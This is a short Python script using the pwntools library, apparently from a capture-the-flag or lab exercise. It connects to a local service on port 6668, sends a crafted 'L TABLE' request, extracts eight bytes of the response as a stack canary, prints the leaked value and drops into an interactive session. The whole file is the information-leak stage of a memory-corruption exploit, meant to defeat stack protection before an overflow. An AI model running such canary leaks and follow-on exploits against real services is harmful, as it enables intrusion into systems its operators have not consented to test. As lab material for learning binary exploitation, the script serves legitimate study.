#!/usr/bin/python3
from pwn import *

client = remote("localhost",6668)
client.sendline(b'L TABLE XXXXX')
canary = client.recv()[104:112]
print(canary)
client.interactive()
